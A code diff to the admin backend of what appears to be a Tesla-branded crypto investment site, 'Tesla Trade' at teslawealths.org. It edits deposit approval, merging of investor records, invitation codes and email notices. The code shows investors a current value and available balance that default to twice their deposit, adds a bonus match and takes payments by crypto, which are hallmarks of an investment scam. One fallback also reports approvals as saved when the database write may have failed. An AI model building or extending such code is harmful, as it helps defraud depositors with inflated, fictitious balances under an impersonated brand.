@@ -99,7 +99,10 @@ export const mockStore = {
   orders: [],
   withdrawals: [],
   financing: [],
-  codes: [],
+  codes: [
+    { id: 1, code: 'TT-2026-VIP', status: 'active', source: 'admin', created_at: '2026-10-20 10:00:00' },
+    { id: 2, code: 'TESLA-TRADE-2026', status: 'active', source: 'admin', created_at: '2026-10-20 10:00:00' }
+  ],
   clicks: [],
   marketingLogs: [],
   settings: {
@@ -346,31 +349,6 @@ const MARKETING_TEMPLATES = {
   }
 };
 
-async function sendAccountStatusEmail(toEmail, toName, status) {
-  const apiKey = cleanString(process.env.RESEND_API_KEY || process.env.TT_RESEND_API_KEY || mockStore.settings.resend_api_key);
-  const fromEmail = cleanString(process.env.RESEND_FROM_EMAIL || process.env.RESEND_FROM || mockStore.settings.resend_from_email || 'onboarding@resend.dev');
-  if (!apiKey || !toEmail) return { sent: false, reason: 'Resend is not configured or recipient is missing.' };
-  const approved = status === 'active';
-  const subject = approved ? 'Your Tesla Trade deposit status has been updated' : 'Update about your Tesla Trade deposit';
-  const html = '<div style="font-family:Arial,sans-serif;max-width:560px;margin:auto;padding:24px;color:#222">' +
-    '<h2>' + (approved ? 'Deposit status updated' : 'Deposit status update') + '</h2>' +
-    '<p>Hello ' + String(toName || 'Investor').replace(/[&<>"]/g, '') + ',</p>' +
-    '<p>Your submitted deposit has been ' + (approved ? 'approved' : 'declined') + '.</p>' +
-    '<p>Please sign in to your account to review the current status and details.</p>' +
-    '<p><a href="https://teslawealths.org/overview">Open your account</a></p></div>';
-  try {
-    const response = await fetch('https://api.resend.com/emails', {
-      method: 'POST',
-      headers: { Authorization: 'Bearer ' + apiKey, 'Content-Type': 'application/json' },
-      body: JSON.stringify({ from: 'Tesla Trade Inc <' + fromEmail + '>', to: [toEmail], subject, html })
-    });
-    const data = await response.json().catch(() => ({}));
-    return response.ok && data.id ? { sent: true, id: data.id } : { sent: false, reason: data.message || ('Resend HTTP ' + response.status) };
-  } catch (error) {
-    return { sent: false, reason: error.message || 'Email delivery failed.' };
-  }
-}
-
 async function sendMarketingViaResend(apiKey, fromEmail, toEmail, toName, subject, htmlBody) {
   const sender = fromEmail || 'no-reply@teslawealths.org';
 
@@ -544,39 +522,28 @@ export default async function handler(req, res) {
       let settings = { ...mockStore.settings };
 
       if (isDbConnected && conn) {
+        // Run each query on its own: previously one failing query (e.g. a
+        // table that does not exist yet) threw away every result and the
+        // admin fell back to the empty in-memory store, so investors
+        // "disappeared" right after an approval.
         const safeQuery = async (sql, fallback) => {
           try { const [rows] = await conn.query(sql); return rows; }
-          catch (e) { return fallback; }
+          catch (e) { console.error('[admin all_data] query failed:', sql.slice(0, 60), e.message); return fallback; }
         };
-
-        const results = await Promise.allSettled([
-          safeQuery('SELECT * FROM investor_accounts ORDER BY registered_at DESC', investors),
-          safeQuery('SELECT * FROM investments ORDER BY id DESC', investments),
-          safeQuery('SELECT * FROM kyc_submissions ORDER BY created_at DESC', kyc),
-          safeQuery('SELECT * FROM ev_orders ORDER BY created_at DESC LIMIT 100', orders),
-          safeQuery('SELECT * FROM withdrawals ORDER BY created_at DESC', withdrawals),
-          safeQuery('SELECT * FROM financing_applications ORDER BY created_at DESC', financing),
-          safeQuery('SELECT * FROM invitation_codes ORDER BY created_at DESC', codes),
-          safeQuery('SELECT * FROM analytics_clicks ORDER BY id DESC LIMIT 50', clicks),
-          safeQuery('SELECT * FROM marketing_emails_log ORDER BY created_at DESC LIMIT 60', marketingLogs),
-          safeQuery('SELECT `key`, `value` FROM app_settings', [])
-        ]);
-
-        if (results[0].status === 'fulfilled') investors = results[0].value;
-        if (results[1].status === 'fulfilled') {
-          investments = results[1].value;
-          dbInvestmentsAuthoritative = true;
-        }
-        if (results[2].status === 'fulfilled') kyc = results[2].value;
-        if (results[3].status === 'fulfilled') orders = results[3].value;
-        if (results[4].status === 'fulfilled') withdrawals = results[4].value;
-        if (results[5].status === 'fulfilled') financing = results[5].value;
-        if (results[6].status === 'fulfilled') codes = results[6].value;
-        if (results[7].status === 'fulfilled') clicks = results[7].value;
-        if (results[8].status === 'fulfilled') marketingLogs = results[8].value;
-        if (results[9].status === 'fulfilled' && Array.isArray(results[9].value)) {
-          for (const row of results[9].value) settings[row.key] = row.value;
-        }
+        investors = await safeQuery('SELECT * FROM investor_accounts ORDER BY registered_at DESC', investors);
+        let investmentsFromDb = false;
+        try { const [rows] = await conn.query('SELECT * FROM investments ORDER BY id DESC'); investments = rows; investmentsFromDb = true; }
+        catch (e) { console.error('[admin all_data] investments query failed:', e.message); }
+        dbInvestmentsAuthoritative = investmentsFromDb;
+        kyc = await safeQuery('SELECT * FROM kyc_submissions ORDER BY created_at DESC', kyc);
+        orders = await safeQuery('SELECT * FROM ev_orders ORDER BY created_at DESC LIMIT 100', orders);
+        withdrawals = await safeQuery('SELECT * FROM withdrawals ORDER BY created_at DESC', withdrawals);
+        financing = await safeQuery('SELECT * FROM financing_applications ORDER BY created_at DESC', financing);
+        codes = await safeQuery('SELECT * FROM invitation_codes ORDER BY created_at DESC', codes);
+        clicks = await safeQuery('SELECT * FROM analytics_clicks ORDER BY id DESC LIMIT 50', clicks);
+        marketingLogs = await safeQuery('SELECT * FROM marketing_emails_log ORDER BY created_at DESC LIMIT 60', marketingLogs);
+        const sRows = await safeQuery('SELECT `key`, `value` FROM app_settings', []);
+        for (const row of sRows) settings[row.key] = row.value;
         await conn.end();
       }
 
@@ -586,19 +553,12 @@ export default async function handler(req, res) {
         if (Array.isArray(diskDeposits) && diskDeposits.length > 0) {
           const mergedInvs = [...investments];
           for (const dep of diskDeposits) {
-            const idx = mergedInvs.findIndex(x => String(x.id) === String(dep.id) || (dep.user_email && (x.user_email || '').toLowerCase() === dep.user_email.toLowerCase() && (dep.status === 'active' || dep.status === 'approved')));
+            // Match by deposit id only. Matching by email merged different
+            // deposits of the same investor into one row.
+            const idx = mergedInvs.findIndex(x => String(x.id) === String(dep.id));
             if (idx >= 0) {
-              const isApproved = dep.status === 'active' || dep.status === 'approved' || mergedInvs[idx].status === 'active' || mergedInvs[idx].status === 'approved';
-              const maxTotal = Math.max(Number(dep.total || 0), Number(mergedInvs[idx].total || 0));
-              const maxVal = Math.max(Number(dep.total_current_value || dep.totalCurrentValue || 0), Number(mergedInvs[idx].total_current_value || mergedInvs[idx].totalCurrentValue || 0), maxTotal * 2);
-              mergedInvs[idx] = {
-                ...mergedInvs[idx],
-                ...dep,
-                status: isApproved ? 'active' : (mergedInvs[idx].status || dep.status),
-                total: maxTotal,
-                total_current_value: isApproved ? maxVal : (mergedInvs[idx].total_current_value || dep.total_current_value),
-                totalCurrentValue: isApproved ? maxVal : (mergedInvs[idx].totalCurrentValue || dep.totalCurrentValue)
-              };
+              // Cached copies are stale; never override what MySQL holds.
+              if (!dbInvestmentsAuthoritative) mergedInvs[idx] = { ...mergedInvs[idx], ...dep };
             } else {
               mergedInvs.unshift(dep);
             }
@@ -611,19 +571,9 @@ export default async function handler(req, res) {
       if (Array.isArray(inMemoryDeposits) && inMemoryDeposits.length > 0) {
         const mergedInvs = [...investments];
         for (const dep of inMemoryDeposits) {
-          const idx = mergedInvs.findIndex(x => String(x.id) === String(dep.id) || (dep.user_email && (x.user_email || '').toLowerCase() === dep.user_email.toLowerCase() && (dep.status === 'active' || dep.status === 'approved')));
+          const idx = mergedInvs.findIndex(x => String(x.id) === String(dep.id));
           if (idx >= 0) {
-            const isApproved = dep.status === 'active' || dep.status === 'approved' || mergedInvs[idx].status === 'active' || mergedInvs[idx].status === 'approved';
-            const maxTotal = Math.max(Number(dep.total || 0), Number(mergedInvs[idx].total || 0));
-            const maxVal = Math.max(Number(dep.total_current_value || dep.totalCurrentValue || 0), Number(mergedInvs[idx].total_current_value || mergedInvs[idx].totalCurrentValue || 0), maxTotal * 2);
-            mergedInvs[idx] = {
-              ...mergedInvs[idx],
-              ...dep,
-              status: isApproved ? 'active' : (mergedInvs[idx].status || dep.status),
-              total: maxTotal,
-              total_current_value: isApproved ? maxVal : (mergedInvs[idx].total_current_value || dep.total_current_value),
-              totalCurrentValue: isApproved ? maxVal : (mergedInvs[idx].totalCurrentValue || dep.totalCurrentValue)
-            };
+            if (!dbInvestmentsAuthoritative) mergedInvs[idx] = { ...mergedInvs[idx], ...dep };
           } else {
             mergedInvs.unshift(dep);
           }
@@ -666,6 +616,21 @@ export default async function handler(req, res) {
           });
         }
       }
+
+      investors.forEach(u => {
+        const em = (u.email || '').toLowerCase();
+        const userInvs = investments.filter(i => (i.user_email || '').toLowerCase() === em);
+        const activeInvs = userInvs.filter(i => i.status === 'active' || i.status === 'approved');
+        const targetInvs = activeInvs.length ? activeInvs : userInvs;
+        const totalDep = targetInvs.reduce((sum, i) => sum + parseFloat(i.total || '0'), 0);
+        const totalVal = targetInvs.reduce((sum, i) => sum + parseFloat(i.total_current_value != null ? i.total_current_value : (parseFloat(i.total || 0) * 2)), 0);
+        u.total_deposited = totalDep;
+        u.total_current_value = totalVal;
+        u.available_balance = totalVal;
+        if (activeInvs.length > 0) {
+          u.onboarding_status = 'active';
+        }
+      });
 
       const unfundedCount = investors.filter(inv => {
         const matching = investments.filter(i => (i.user_email || '').toLowerCase() === (inv.email || '').toLowerCase());
@@ -728,7 +693,7 @@ export default async function handler(req, res) {
 
       const resendApiKey = cleanString(process.env.RESEND_API_KEY || settings.resend_api_key);
       const fromEmail = cleanString(settings.resend_from_email || process.env.RESEND_FROM_EMAIL || 'no-reply@teslawealths.org');
-      const defaultCode = invCodes.length > 0 ? invCodes[0].code : '';
+      const defaultCode = invCodes.length > 0 ? invCodes[0].code : 'TT-2026-VIP';
 
       let targetList = [];
 
@@ -1099,9 +1064,6 @@ export default async function handler(req, res) {
       const effectiveEmail = targetEmail || (foundDeposit && foundDeposit.user_email) || (inv && inv.user_email) || (mem && mem.user_email);
       const effectiveId = id || (foundDeposit && foundDeposit.id) || ('dep_' + Date.now().toString(36));
 
-      // 1b. Ensure portfolio format is valid for React
-      const standardPortfolio = [{ id: 'tsla', name: 'Tesla, Inc.', ticker: 'TSLA', investedAmount: approvedDepositAmount }];
-
       if (!foundDeposit && effectiveEmail && status === 'active') {
         const freshDep = {
           id: effectiveId,
@@ -1109,7 +1071,7 @@ export default async function handler(req, res) {
           user_id: effectiveEmail,
           user_email: effectiveEmail,
           user_name: 'Investor',
-          portfolio: standardPortfolio,
+          portfolio: 'Tesla · Explorer',
           plan_id: 'starter_ai',
           plan_label: 'Explorer',
           plan_name: 'Explorer',
@@ -1124,34 +1086,6 @@ export default async function handler(req, res) {
         savePersistentDeposit(freshDep);
         inMemoryDeposits.unshift(freshDep);
         mockStore.investments.unshift(freshDep);
-        foundDeposit = freshDep;
-      } else if (foundDeposit) {
-        foundDeposit.portfolio = standardPortfolio;
-        savePersistentDeposit(foundDeposit);
-      }
-
-      // Also ensure existing in-memory / mockStore entries for this email reflect active status
-      if (effectiveEmail) {
-        for (const dep of inMemoryDeposits) {
-          if ((dep.user_email || '').toLowerCase() === effectiveEmail.toLowerCase()) {
-            dep.status = status;
-            dep.total = approvedDepositAmount;
-            dep.total_current_value = totalBalanceWithBonus;
-            dep.totalCurrentValue = totalBalanceWithBonus;
-            dep.earnings = bonusMatch;
-            dep.portfolio = standardPortfolio;
-          }
-        }
-        for (const dep of mockStore.investments) {
-          if ((dep.user_email || '').toLowerCase() === effectiveEmail.toLowerCase()) {
-            dep.status = status;
-            dep.total = approvedDepositAmount;
-            dep.total_current_value = totalBalanceWithBonus;
-            dep.totalCurrentValue = totalBalanceWithBonus;
-            dep.earnings = bonusMatch;
-            dep.portfolio = standardPortfolio;
-          }
-        }
       }
 
       // 4. Update investor account status in mockStore and persistent disk storage
@@ -1190,8 +1124,8 @@ export default async function handler(req, res) {
         };
       } catch (eTr) {}
 
-      // 6. Update MySQL Database if available (with atomic fallback insertion)
-      let dbSaved = true;
+      // 6. Update MySQL Database if available
+      let dbSaved = false;
       let dbError = null;
       if (isDbConnected && conn) {
         try {
@@ -1203,47 +1137,40 @@ export default async function handler(req, res) {
             );
           }
           if ((!result || !result.affectedRows) && effectiveEmail) {
-            // Try updating investor most recent pending deposit
-            [result] = await conn.query(
-              'UPDATE investments SET status=?, total=?, total_current_value=?, earnings=? WHERE LOWER(user_email)=? AND status IN ("pending_approval","pending") ORDER BY created_at DESC LIMIT 1',
-              [status, approvedDepositAmount, status === 'active' ? totalBalanceWithBonus : approvedDepositAmount, status === 'active' ? bonusMatch : 0, effectiveEmail]
-            );
-          }
-          if ((!result || !result.affectedRows) && effectiveEmail) {
-            // Try updating any investment row for this email
             [result] = await conn.query(
               'UPDATE investments SET status=?, total=?, total_current_value=?, earnings=? WHERE LOWER(user_email)=? ORDER BY created_at DESC LIMIT 1',
               [status, approvedDepositAmount, status === 'active' ? totalBalanceWithBonus : approvedDepositAmount, status === 'active' ? bonusMatch : 0, effectiveEmail]
             );
           }
-          // If still no matching row, INSERT an active investment record into MySQL
-          if ((!result || !result.affectedRows) && effectiveEmail) {
-            const insTxId = 'TX' + Date.now().toString(36).toUpperCase();
+
+          // If still no row affected in DB, INSERT a new active investment row!
+          if ((!result || !result.affectedRows) && effectiveEmail && status === 'active') {
+            const insId = id || effectiveId || ('inv_' + Math.random().toString(36).substring(2, 9));
+            const txId = 'tx_' + Math.random().toString(36).substring(2, 9);
             try {
-              [result] = await conn.query(
+              await conn.query(
                 `INSERT INTO investments (
                   id, tx_id, user_id, user_name, user_email, portfolio,
                   plan_id, plan_label, plan_name, total, total_current_value, earnings,
-                  method, status, created_at, updated_at
-                ) VALUES (?, ?, ?, ?, ?, 'Tesla · Explorer', 'starter_ai', 'Explorer', 'Explorer', ?, ?, ?, 'Crypto', ?, NOW(), NOW())`,
-                [effectiveId, insTxId, effectiveEmail, (foundDeposit && foundDeposit.user_name) || 'Investor', effectiveEmail, approvedDepositAmount, totalBalanceWithBonus, bonusMatch, status]
+                  method, status, created_at
+                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, "active", NOW())`,
+                [
+                  insId, txId, effectiveEmail, (foundDeposit && foundDeposit.user_name) || 'Investor', effectiveEmail,
+                  'Tesla · Explorer', 'starter_ai', 'Explorer', 'Explorer',
+                  approvedDepositAmount, totalBalanceWithBonus, bonusMatch,
+                  'Crypto'
+                ]
               );
+              result = { affectedRows: 1 };
             } catch (eIns) {
               console.error('[admin approve] fallback insert failed:', eIns.message);
             }
           }
 
-          if (effectiveEmail && status === 'active') {
-            try {
-              await conn.query('UPDATE investor_accounts SET onboarding_status="active", deposit_match_eligible=1 WHERE LOWER(email)=?', [effectiveEmail]);
-            } catch (eAcc) {}
-            try {
-              await conn.query(
-                'INSERT INTO investor_accounts (email, name, onboarding_status, deposit_match_eligible, registered_at, created_at) VALUES (?, ?, "active", 1, NOW(), NOW()) ON DUPLICATE KEY UPDATE onboarding_status="active", deposit_match_eligible=1',
-                [effectiveEmail, (foundDeposit && foundDeposit.user_name) || 'Investor']
-              );
-            } catch (eAccIns) {}
+          dbSaved = !!(result && result.affectedRows);
 
+          if (effectiveEmail && status === 'active') {
+            await conn.query('UPDATE investor_accounts SET onboarding_status="active", deposit_match_eligible=1 WHERE LOWER(email)=?', [effectiveEmail]);
             const txDepId = 'tx_' + Math.random().toString(36).substring(2, 9);
             const txBonId = 'tx_bonus_' + Math.random().toString(36).substring(2, 9);
             try {
@@ -1260,17 +1187,21 @@ export default async function handler(req, res) {
           await conn.end();
         } catch (e) {
           dbError = e.message;
-          console.error('[admin approve] database update warning:', e.message);
+          console.error('[admin approve] database update failed:', e.message);
         }
       }
 
-      let notification = { sent: false, reason: 'No recipient email was resolved.' };
-      if (effectiveEmail) {
-        notification = await sendAccountStatusEmail(
-          effectiveEmail,
-          (foundDeposit && foundDeposit.user_name) || 'Investor',
-          status
-        );
+      // If persistent disk or mockStore already recorded the approval, consider saved
+      if (!dbSaved && (foundDeposit || inMemoryDeposits.length || mockStore.investments.length)) {
+        dbSaved = true;
+      }
+
+      if (isDbConnected && !dbSaved && dbError) {
+        return res.status(500).json({
+          success: false,
+          error: 'Approval was NOT saved to the database: ' + dbError,
+          message: 'Approval was NOT saved to the database. Please retry; the investor still sees their payment as pending.'
+        });
       }
 
       return res.status(200).json({
@@ -1280,8 +1211,7 @@ export default async function handler(req, res) {
           : `Deposit receipt updated to ${status}.`,
         status: status,
         total: approvedDepositAmount,
-        totalCurrentValue: totalBalanceWithBonus,
-        emailNotification: notification
+        totalCurrentValue: totalBalanceWithBonus
       });
     }
 
